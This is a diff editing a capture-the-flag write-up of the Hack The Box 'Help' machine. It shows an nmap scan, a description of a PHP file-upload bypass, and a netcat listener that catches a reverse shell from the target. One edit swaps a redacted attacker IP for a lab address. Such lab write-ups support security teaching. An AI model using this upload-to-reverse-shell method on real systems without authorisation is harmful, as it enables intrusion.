@@ -18,9 +18,7 @@ As always, the easiest and most effective tool in the reconnaissance stage is nm
 
 ```text
 ~/ctf/htb/help λ sudo nmap -sS -A 10.10.10.121
-```
 
-```text
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-29 08:41 CDT
 Nmap scan report for 10.10.10.121
 Host is up (0.051s latency).
@@ -228,7 +226,7 @@ So as long as the file is uploaded via PHP's HTTP POST mechanism, the function r
 
 To summarize our progress so far, we now know where our uploaded files go on the server and we've realized we can upload php files despite what errors the website gives us. Our two road blocks are conquered, so it's time to exploit.
 
-## Exploitation
+## Exploitation: 2
 
 The exploit script takes two arguments. The first is the base URL where files are uploaded which we found by looking at the code. The second argument is the name of the file we uploaded.
 
@@ -251,7 +249,7 @@ Now simply browse to the URL where our reverse shell is located and it'll trigge
 ```text
 ~/ctf/htb/help λ nc -l -n -v -p 9002
 listening on [any] 9002 ...
-connect to [10.10.x.x] from (UNKNOWN) [10.10.10.121] 37802
+connect to [10.10.14.33] from (UNKNOWN) [10.10.10.121] 37802
 Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
  12:51:29 up 6 days, 13:27,  0 users,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
